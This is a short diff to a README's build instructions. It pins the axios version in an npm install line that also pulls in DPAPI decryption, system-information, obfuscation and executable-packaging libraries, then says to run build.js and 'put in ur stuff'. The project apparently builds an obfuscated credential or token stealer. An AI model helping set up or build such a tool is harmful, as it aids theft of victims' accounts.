@@ -16,7 +16,7 @@
 - install nodejs
 - open cmd
 - do cd $directory
-- do npm install discord.js adm-zip @primno/dpapi axios systeminformation form-data javascript-obfuscator pkg
+- do npm install discord.js adm-zip @primno/dpapi axios@^0.27.2 systeminformation form-data javascript-obfuscator pkg
 - when done run node build.js
 - put in ur stuff
 - done
